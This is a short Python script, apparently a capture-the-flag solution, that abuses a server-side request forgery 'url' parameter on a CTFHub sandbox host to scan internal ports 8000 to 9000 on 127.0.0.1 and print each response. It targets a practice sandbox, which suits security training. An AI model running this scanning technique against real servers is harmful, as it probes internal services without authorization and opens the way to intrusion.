import requests

url = 'http://challenge-3151dc1e80c6c507.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000'
for i in range(8000, 9001):
    url = f'http://challenge-3151dc1e80c6c507.sandbox.ctfhub.com:10800/?url=127.0.0.1:{i}'
    r = requests.get(url)
    result = r.text
    print(i, result)


